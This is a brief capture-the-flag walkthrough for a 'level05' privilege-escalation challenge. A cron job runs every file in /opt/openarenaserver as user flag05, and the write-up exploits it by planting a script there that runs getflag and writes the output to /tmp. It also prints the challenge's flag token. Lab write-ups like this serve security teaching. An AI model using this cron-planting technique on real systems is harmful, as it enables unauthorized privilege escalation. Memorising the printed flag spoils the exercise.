1. like level00 we do find / -name level05 2>/dev/null 
	we get result /var/mail/level05
				/rofs/var/mail/level05
2. we cat either of the file , we get content:
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	accorfing to https://crontab.guru/#*/2_*_*_*_*
	this crontab means every 2 mins we are the shell script as user flag05's right
3, we cat the shell script
	cat /usr/sbin/openarenaserver
	for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
	done
	above scripting means:
	Gets all file of the directory /opt/openarenaserver/
	Set the CPU time limit to 5 Seconds
	Execute the file that is being processed
	Delete the file / bash -x means before run command will print the command, so we know which command we are running
4. so we can run a script in the folder which runs getflag and save the result somewhere in a file.
	echo '/bin/getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
5, wait ard 2 min, we cat /tmp/flag05
	we get the token viuaaale9huek52boumoomioc
	bingo!
